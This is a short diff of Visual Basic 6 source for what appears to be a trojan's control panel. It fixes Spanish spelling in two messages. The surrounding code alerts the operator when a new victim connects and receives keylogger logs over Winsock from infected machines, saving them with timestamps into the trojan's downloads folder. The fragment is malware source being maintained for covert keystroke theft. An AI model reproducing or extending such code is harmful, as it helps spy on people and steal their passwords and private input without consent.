@@ -382,7 +382,7 @@ If GetAsyncKeyState(119) = -32767 Then
 End If
 
 If usercon = True Then
-    MsgBox "Se ah conectado un nuevo usuario", vbInformation + vbOKOnly, "Conectado"
+    MsgBox "Se ha conectado un nuevo usuario", vbInformation + vbOKOnly, "Conectado"
     Me.Visible = True
     lista.Visible = True
     usercon = False
@@ -533,7 +533,7 @@ Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
             If PathFileExists(App.path & "\keylogger.txt") Then
                 If FileLen(App.path & "\keylogger.txt") >= lFileSize Then
                     Sleep 1000
-                    lista.List1.ListItems.Add , , "[ El keylogger se ah recibido con exito en la carpeta del troyano, DESCARGAS\keylogger.txt ]"
+                    lista.List1.ListItems.Add , , "[ El keylogger se ha recibido con exito en la carpeta del troyano, DESCARGAS\keylogger.txt ]"
                     CopyFile App.path & "\keylogger.txt", App.path & "\DESCARGAS\keylogger " & Month(Now) & "-" & Day(Now) & "-" & Year(Now) & "- " & Hour(Now) & "-" & Minute(Now) & "-" & Second(Now) & ".txt", False
                     DeleteFile App.path & "\keylogger.txt"
                 Else
